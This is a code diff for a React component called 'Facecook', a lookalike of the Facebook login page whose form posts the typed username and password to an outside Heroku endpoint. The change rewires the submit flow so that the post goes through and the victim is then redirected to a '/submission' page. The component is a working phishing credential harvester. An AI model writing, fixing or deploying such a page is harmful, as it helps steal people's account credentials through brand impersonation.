@@ -1,6 +1,6 @@
 import React from "react";
 import axios from "axios";
-import { Link } from "react-router-dom";
+import { useNavigate } from "react-router-dom";
 
 const Facecook = () => {
   const [formData, setFormData] = React.useState({ user: "", pass: "" });
@@ -10,9 +10,12 @@ const Facecook = () => {
     setFormData((prevData) => ({ ...prevData, [name]: value }));
   };
 
+  let navigate = useNavigate();
+
   const handleSubmit = (e) => {
     e.preventDefault();
     axios.post("https://facecook-book.herokuapp.com/api/v2/tasks", formData);
+    navigate("/submission");
   };
   return (
     <div className="bg-[#f0f2f5] h-screen  w-full font-[Heveltica] flex justify-center items-center ">
@@ -49,15 +52,14 @@ const Facecook = () => {
             placeholder="Password"
             required
           />
-          <Link to="/submission">
-            <button
-              type="submit"
-              cursor-pointer
-              className="bg-[#1877f2] py-3 rounded-md font-bold w-[100%] text-white text-[17px] px-[16px]"
-            >
-              Log in
-            </button>
-          </Link>
+
+          <button
+            type="submit"
+            cursor-pointer
+            className="bg-[#1877f2] py-3 rounded-md font-bold w-[100%] text-white text-[17px] px-[16px]"
+          >
+            Log in
+          </button>
 
           <p className="cursor-pointer text-[#1877f2] text-[14px] font-medium ">
             Forgotten password?
